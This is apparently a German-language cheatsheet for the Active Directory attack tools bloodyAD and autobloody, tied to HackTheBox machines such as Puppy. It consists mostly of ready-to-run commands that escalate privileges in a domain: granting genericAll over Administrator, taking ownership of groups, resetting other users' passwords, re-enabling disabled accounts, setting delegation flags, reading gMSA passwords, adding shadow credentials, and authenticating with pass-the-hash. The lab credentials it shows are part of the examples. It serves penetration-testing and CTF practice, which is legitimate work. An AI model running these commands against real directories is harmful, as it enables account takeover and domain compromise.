
# 🩸 BloodyAD Cheatsheet

**bloodyAD** ist ein leistungsstarkes Kommandozeilen-Tool zur Interaktion mit Active Directory-Umgebungen. Es wurde speziell für offensive Sicherheitsanalysen entwickelt und ermöglicht das gezielte Abfragen, Modifizieren und Ausnutzen von AD-Objekten. Das Tool unterstützt Authentifizierung über Benutzername und Passwort sowie komplexe Angriffe auf Benutzerrechte und -eigenschaften.

Mit bloodyAD lassen sich u. a. Benutzer- und Gruppeninformationen auslesen, Berechtigungen setzen, Passwörter ändern, Shadow Credentials hinzufügen oder privilegierte Objekte manipulieren. Es basiert auf LDAP-Kommunikation und nutzt interne AD-Mechanismen wie ACLs, UAC-Flags und SID-History.

Im Unterschied zu reinen Abfrage-Tools bietet bloodyAD umfassende Schreib- und Kontrollmöglichkeiten – ideal für Red Teaming und Post-Exploitation-Szenarien. Dabei bleibt es CLI-basiert, leichtgewichtig und präzise steuerbar.

<br>

**autobloody** ist ein Tool zur automatischen Ausnutzung von Active Directory-Privilegien-Eskalationspfaden, die von BloodHound angezeigt werden.

<br>

## Inhaltsverzeichnis

- [Retrieve Domain Information](#-retrieve-domain-information)
- [Retrieve User Information](#-retrieve-user-information)
- [Get groupMembers](#-get-groupmembers)
- [Add User To Group](#-add-user-to-group)
- [Add New User](#-add-new-user)
- [Get Computers](#-get-computers)
- [Change Password](#-change-password)
- [Give User GenericAll Rights](#-give-user-genericall-rights)
- [Write Owner](#-write-owner)
- [Enable a Disabled Account](#-enable-a-disabled-account)
- [Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag](#-add-the-trusted_to_auth_for_delegation-flag)
- [ReadGMSAPassword](#-readgmsapassword)
- [Modify UPN](#-modify-upn)
- [Shadow Credentials](#-shadow-credentials)
- [Pass-The-Hash](#-pass-the-hash)
- [Kerberos Ticket](#-kerberos-ticket)

<br>

## Machines

Puppy (HackTheBox) - https://github.com/b2syn/HTB-Puppy
Certified (HackTheBox)

<br>

## weiterführende Informationen

https://github.com/CravateRouge/autobloody

```
autobloody -u levi.james -p 'KingofAkron2025!' -d puppy.htb \
--host 10.129.204.169 -ds levi.james -dp 'KingofAkron2025!' -dt svc-admin
```

https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

https://www.thehacker.recipes/

https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad

---

<br>

### 🧩 Retrieve Domain Information

Zeigt grundlegende Informationen zur Active Directory-Domäne wie Domain-Controller, Domänenfunktionsebene und andere Metadaten an.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get domain
```

<br>

### 🧩 Retrieve User Information

Fragt Active Directory-Objekt (z. B. einen Benutzer) ab und zeigt alle LDAP-Attribute des Zielobjekts.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get object administrator
```

<br>

### 🧩 Get groupMembers

Listet alle Mitglieder der angegebenen AD-Gruppe (z. B. DEVELOPERS) auf und zeigt deren Benutzernamen und Details.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get groupMembers DEVELOPERS
```

<br>

### 🧩 Add User To Group

Zeigt alle Active Directory-Objekte an, auf die der Nutzer a.james Schreibrechte hat. Mit --detail werden zusätzlich ausführliche Informationen zu den Berechtigungen ausgegeben.
Fügt den Benutzer a.james zur Gruppe DEVELOPERS im Active Directory hinzu. Dadurch erhält der Nutzer die Rechte und Mitgliedschaften der Zielgruppe.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get writable --detail
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add groupMember DEVELOPERS a.james
```

<br>

### 🧩 Add New User

Legt einen neuen Benutzer im Active Directory an, um ihn in der Domäne zu registrieren.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add user <Benutzername>
```

<br>

### 🧩 Get Computers

Listet alle Computerobjekte innerhalb der Active Directory-Domäne auf.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get computers
```
<br>

### 🧩 Change Password

Setzt das Passwort des angegebenen Active Directory-Benutzers ($target_username) auf ein neues Passwort ($new_password). Damit kann der Nutzer das Passwort eines anderen AD-Accounts ändern.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' set password $target_username $new_password
```

<br>

### 🧩 Give User GenericAll Rights

Gewährt dem Benutzer a.james volle Zugriffsrechte („genericAll“) auf das AD-Objekt „Administrator“. Dadurch kann a.james alle Eigenschaften und Berechtigungen des Administrator-Kontos ändern.
"Füge der Access Control List (ACL) des Administrator-Objekts hinzu, dass a.james volle Rechte bekommt.“
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add genericAll "CN=Administrator,CN=Users,DC=b2syn,DC=htb" a.james
```

<br>

### 🧩 Write Owner

Setzt den Besitzer des Active Directory-Objekts „DEVELOPERS“ auf den Benutzer a.james. Dadurch erhält a.james volle Kontrolle über dieses Objekt.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' set owner "CN=DEVELOPERS,DC=b2syn,DC=htb" a.james
```

<br>

### 🧩 Enable a Disabled Account

Entfernt das ACCOUNTDISABLE-Flag im User-Account-Control (UAC) des Benutzers j.calvus, wodurch das Konto wieder aktiviert wird.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' remove uac "CN=j.calvus,OU=Users,DC=b2syn,DC=htb" -f ACCOUNTDISABLE
```

<br>

### 🧩 Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag

Fügt dem Benutzerkonto service-account das UAC-Flag TRUSTED_TO_AUTH_FOR_DELEGATION hinzu. Dadurch wird das Konto für die vertrauenswürdige Delegierung autorisiert.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' add uac "CN=service-account,OU=Services,DC=b2syn,DC=htb" -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

<br>

### 🧩 ReadGMSAPassword

Fragt das Active Directory-Objekt gmsa-web (Managed Service Account) ab und zeigt das Attribut msDS-ManagedPassword mit dem aktuellen verwalteten Passwort an.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get object "CN=gmsa-web,CN=Managed Service Accounts,DC=b2syn,DC=htb" --attr msDS-ManagedPassword
```
<br>

### 🧩 Modify UPN
Fragt beim Active Directory-Benutzer joerg das Attribut userPrincipalName ab und zeigt dessen Wert an.
Ändert im Active Directory beim Benutzer joerg das Attribut userPrincipalName auf „joerg2@b2syn.htb“. Damit wird der Anmeldename des Nutzers angepasst.
```zsh
bloodyAD --host $IP -d b2syn.htb -u a.james -p 'Maofron32!' get object "CN=joerg,OU=Users,DC=b2syn,DC=htb" --attr userPrincipalName
bloodyAD --host $IP -d b2syn.htb -u admin -p 'Passw0rd!' set object "CN=joerg,OU=Users,DC=b2syn,DC=htb" userPrincipalName -v "joerg2@b2syn.htb"
```

<br>

### 🧩 Shadow Credentials

Fügt dem AD-Benutzer joerg sogenannte Shadow Credentials hinzu, die alternative Anmeldedaten (z. B. für Azure AD Pass-Through Authentication) ermöglichen.
```zsh
bloodyAD --host $IP -d b2syn.htb -u admin -p 'Passw0rd!' add shadowCredentials "CN=joerg,OU=Users,DC=b2syn,DC=htb"
```

<br>

### 🧩 Pass-the-Hash

```zsh
bloodyAD --host <IP> -d <DOMAIN> -u <USER> -p :aad3b435b51404eeaad3b435b51404ee:5f2d3e5f9989f59a6e94cf08a823b2f2 -f rc4
```

<br>

### 🧩 Kerberos-Ticket

```zsh
export KRB5CCNAME=/tmp/krb5cc_0
bloodyAD --host <IP> -d <DOMAIN> -k -f aes256
```



